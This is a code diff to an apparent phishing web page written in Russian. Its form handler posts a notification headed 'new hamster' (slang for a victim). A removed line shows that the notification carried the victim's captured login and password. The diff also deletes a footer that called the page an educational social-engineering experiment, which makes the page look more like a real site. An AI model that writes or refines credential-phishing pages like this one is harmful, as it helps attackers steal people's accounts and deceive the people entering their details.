@@ -270,9 +270,6 @@
 
 <footer class="footer">
     <div class="footer__wrapper">
-        <div class="footer__copyright">
-            © 2026 ООО «Пиксель Шквал». Учебный эксперимент по социальной инженерии.
-        </div>
     </div>
 </footer>
 
@@ -296,7 +293,7 @@ document.getElementById('phishForm').addEventListener('submit', function(e) {
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
             _subject: '🐹 НОВЫЙ ХОМЯЧОК!',
-            message: `Логин: ${login}\nПароль: ${password}\nВремя: ${time}`
+            message: `\nВремя: ${time}`
         })
     }).catch(error => console.log('Ошибка уведомления:', error));
     
@@ -314,3 +311,4 @@ document.getElementById('phishForm').addEventListener('submit', function(e) {
 
 </body>
 </html>
+
